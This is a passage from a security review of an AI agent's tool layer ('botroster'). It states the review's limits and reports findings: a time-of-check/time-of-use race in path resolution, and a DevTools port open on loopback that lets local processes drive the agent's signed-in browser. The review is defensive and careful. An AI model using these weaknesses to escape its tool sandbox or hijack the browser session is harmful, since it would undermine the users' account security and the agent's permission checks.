- **No test suite was run** (`cargo check -p botroster-guest` was permitted but not needed for any
  finding; nothing here rests on compilation behaviour). The 20 live browser tests in
  `tests/browser.rs` were read, not executed, so I am reporting what they assert, not that they pass.
- **Windows-specific behaviours are reasoned, not measured**: the UNC/NTLM reach in F-GT12, 8.3 short
  names, and drive-relative paths (`C:foo`). On the last two I concluded `resolve` is sound —
  `canonicalize` expands short names for existing components and the tail cannot be one, and
  `PathBuf::join` with a disk-prefixed relative path resolves against the process CWD and is then
  refused by the root check — but neither is covered by a test. The reserved-device-name canary at
  `tools.rs:1085-1120` covers `CON`/`NUL`/`COM1` and documents itself as asserting a property of the
  platform rather than of `resolve`, which I agree with.
- **Out of scope, read only far enough to check a claim**: `botrosterd`'s policy engine beyond
  `Default` (`policy.rs:118-181`), the approval-card rendering, and how `botroster-agent` surfaces a
  `ToolError` string to the model. "Error quality" in this report is therefore judged at the guest's
  boundary — the message the hub receives — not as the model finally sees it.
- **TOCTOU between `resolve` and the open** is real (the resolved path is re-opened, not held) but I
  found no in-product exploit: no tool creates symlinks except `shell.exec`, and `shell.exec` does
  not need one. It becomes live on an account where `shell.exec` is denied but two tool calls still
  run concurrently (`client.rs:257-262`); the durable fix is to open once and operate on the handle.
- **Deliberately not ranked**: the browser's DevTools port is unauthenticated on loopback
  (`browser.rs:709-725`), so any local process can drive the agent's signed-in browser. Real, but it
  needs local code execution, at which point `shell.exec`'s reach dwarfs it.
